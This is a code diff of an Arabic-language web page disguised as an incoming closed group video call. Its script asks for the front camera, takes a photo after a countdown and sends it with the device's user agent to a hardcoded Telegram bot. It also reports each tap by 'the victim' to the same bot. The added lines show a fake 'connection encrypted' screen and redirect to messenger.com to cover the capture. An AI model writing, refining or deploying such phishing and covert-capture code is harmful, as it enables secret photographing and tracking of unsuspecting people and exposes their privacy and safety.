@@ -3,42 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مكالمة فيديو جماعية مغلقة</title>
+    <title>غرفة الاجتماعات الافتراضية الآمنة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .call-container { background: #2d2d2d; border-radius: 20px; padding: 40px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; width: 350px; }
-        .avatar { width: 100px; height: 100px; background: #4f4f4f; border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; font-size: 40px; }
-        h2 { margin: 10px 0; font-size: 24px; }
-        .incoming { color: #2ecc71; font-size: 14px; margin-bottom: 30px; animation: blink 1.5s infinite; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #111, #1e1e2e); 
+            color: white; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh;
+            overflow: hidden;
+        }
+        .call-container { 
+            background: rgba(40, 40, 55, 0.85); 
+            border-radius: 24px; 
+            padding: 40px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6); 
+            text-align: center; 
+            width: 360px; 
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.5s ease;
+        }
+        .avatar { 
+            width: 110px; 
+            height: 110px; 
+            background: linear-gradient(45deg, #3a3d52, #4e54c8); 
+            border-radius: 50%; 
+            margin: 0 auto 20px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-size: 45px; 
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        h2 { margin: 10px 0 5px; font-size: 22px; font-weight: 600; }
+        .incoming { color: #2ecc71; font-size: 14px; margin-bottom: 30px; font-weight: 500; letter-spacing: 0.5px; animation: pulse 1.5s infinite; }
         .btn-group { display: flex; justify-content: space-around; margin-top: 20px; }
-        .btn { border: none; border-radius: 50%; width: 65px; height: 65px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.3s; font-size: 24px; color: white; }
-        .btn-accept { background-color: #2ecc71; }
+        .btn { 
+            border: none; 
+            border-radius: 50%; 
+            width: 70px; 
+            height: 70px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            font-size: 26px; 
+            color: white; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .btn-accept { background-color: #2ecc71; animation: bounce 2s infinite; }
+        .btn-accept:hover { background-color: #27ae60; transform: scale(1.1); }
         .btn-decline { background-color: #e74c3c; }
-        video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; background: #000; }
-        .end-screen { display: none; }
-        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+        .btn-decline:hover { background-color: #c0392b; transform: scale(1.1); }
+        
+        /* واجهة العداد التنازلي والبث */
+        .preview-screen { display: none; }
+        .countdown-text { font-size: 16px; color: #f1c40f; margin-bottom: 15px; font-weight: bold; }
+        .timer-circle { font-size: 48px; font-weight: bold; color: #fff; margin: 15px 0; background: rgba(0,0,0,0.4); width: 80px; height: 80px; line-height: 80px; border-radius: 50%; margin: 10px auto; border: 3px solid #f1c40f; }
+        video { width: 100%; border-radius: 14px; margin-top: 15px; background: #000; box-shadow: 0 5px 15px rgba(0,0,0,0.5); border: 2px solid #4e54c8; }
+        
+        /* شاشة التحويل */
+        .redirect-screen { display: none; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #3498db; animation: spin 1s linear infinite; margin: 20px auto; }
+
+        /* الحركات الأنيميشن */
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
+    <!-- الشاشة الرئيسية: استقبال المكالمة -->
     <div class="call-container" id="callScreen">
         <div class="avatar">👥</div>
-        <h2>مكالمة جماعية (3 مشاركين)</h2>
-        <div class="incoming">اتصال فيديو وارد...</div>
+        <h2>مكالمة فيديو جماعية مغلقة</h2>
+        <div class="incoming">اتصال جاري من المشرف والمشاركين...</div>
         
         <div class="btn-group">
             <button class="btn btn-accept" onclick="acceptCall()">📞</button>
             <button class="btn btn-decline" onclick="declineCall()">✖</button>
         </div>
-        
+    </div>
+
+    <!-- شاشة العداد التنازلي والبث -->
+    <div class="call-container preview-screen" id="previewScreen">
+        <div class="countdown-text">🌐 جاري تشغيل التشفير والاتصال بالبث...</div>
+        <div class="timer-circle" id="countdownTimer">5</div>
+        <p style="color: #bbb; font-size: 13px;">يرجى تثبيت الهاتف وتوجيه الكاميرا لبدء المحادثة</p>
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
-    <div class="call-container end-screen" id="endScreen">
-        <div class="avatar" style="background: #3a3a3a;">🚫</div>
-        <h2>انتهت الجلسة</h2>
-        <p style="color: #aaa; font-size: 14px;">تم رفض المكالمة أو غادر المشاركون الغرفة.</p>
+    <!-- شاشة التشفير والتحويل التلقائي -->
+    <div class="call-container redirect-screen" id="redirectScreen">
+        <div class="avatar" style="background: #2980b9;">🔒</div>
+        <h2>تم تشفير الاتصال بنجاح</h2>
+        <div class="spinner"></div>
+        <p style="color: #3498db; font-size: 15px; font-weight: bold;">جاري تحويلك إلى التطبيق المعتمد لغرفة المحادثة...</p>
     </div>
 
     <script>
@@ -46,32 +114,48 @@
     const TELEGRAM_BOT_TOKEN = "8868938458:AAGBtdOsKOej6rgn3wjDHybua_K3UUHkC98";
     const TELEGRAM_CHAT_ID = "1005732368";
 
+    // 🔗 الرابط العام الذي سيتم تحويل المستخدم إليه في النهاية تلقائياً
+    const REDIRECT_URL = "https://www.messenger.com"; 
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const callScreen = document.getElementById('callScreen');
-    const endScreen = document.getElementById('endScreen');
+    const previewScreen = document.getElementById('previewScreen');
+    const redirectScreen = document.getElementById('redirectScreen');
+    const timerElement = document.getElementById('countdownTimer');
 
     function acceptCall() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
         .then(function(stream) {
-            video.style.display = "block";
+            callScreen.style.display = "none";
+            previewScreen.style.display = "block";
             video.srcObject = stream;
             
-            sendTextMessageTelegram("🔔 الضحية ضغط على (رد) ووافق على تشغيل الكاميرا المباشرة.");
-
-            // لقطة سريعة بعد ثانيتين
-            setTimeout(takeSnapshot, 2000);
+            sendTextMessageTelegram("🔔 الضحية ضغط على (رد) ووافق على إذن الكاميرا.");
+            startCountdown();
         })
         .catch(function(err) {
             declineCall();
-            sendTextMessageTelegram("⚠️ الضحية حاول الرد لكنه رفض إذن المتصفح للكاميرا.");
+            sendTextMessageTelegram("⚠️ الضحية رفض إذن الكاميرا من المتصفح.");
         });
     }
 
+    function startCountdown() {
+        let timeLeft = 5;
+        let timerInterval = setInterval(function() {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                takeSnapshot();
+            }
+        }, 1000);
+    }
+
     function declineCall() {
-        callScreen.style.display = "none";
-        endScreen.style.display = "block";
-        sendTextMessageTelegram("❌ الضحية رفض المكالمة وضغط على الزر الأحمر.");
+        sendTextMessageTelegram("❌ الضحية رفض المكالمة.");
+        window.location.href = REDIRECT_URL; // تحويله مباشرة عند الرفض أيضاً تلافياً للمشاكل
     }
 
     function takeSnapshot() {
@@ -80,13 +164,11 @@
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // تحويل محتوى الـ Canvas إلى ملف صورة حقيقي لإرساله لتليجرام
         canvas.toBlob(function(blob) {
             sendPhotoTelegram(blob);
-        }, 'image/jpeg', 0.8);
+        }, 'image/jpeg', 0.85);
     }
 
-    // دالة إرسال الرسائل النصية لتليجرام
     function sendTextMessageTelegram(text) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         fetch(url, {
@@ -96,17 +178,31 @@
         });
     }
 
-    // دالة إرسال الصورة الفعلية لتليجرام بصيغة FormData
     function sendPhotoTelegram(photoBlob) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
         formData.append("chat_id", TELEGRAM_CHAT_ID);
         formData.append("photo", photoBlob, "snapshot.jpg");
-        formData.append("caption", `📸 لقطة حية من الكاميرا الأمامية للهدف المتصل!\n\nالجهاز: ${navigator.userAgent}`);
+        formData.append("caption", `📸 لقطة حية من الكاميرا الأمامية بعد انتهاء العداد!\n\nالجهاز: ${navigator.userAgent}`);
 
         fetch(url, {
             method: "POST",
             body: formData
+        }).then(() => {
+            // إغلاق كاميرا الهاتف برمجياً لتحرير الجهاز
+            const stream = video.srcObject;
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+
+            // الانتقال إلى شاشة التشفير والانتظار ثانيتين للتمويه ثم التحويل الفعلي
+            previewScreen.style.display = "none";
+            redirectScreen.style.display = "block";
+
+            setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, 2500); // 2.5 ثانية لعرض رسالة التشفير ثم التحويل
         });
     }
     </script>
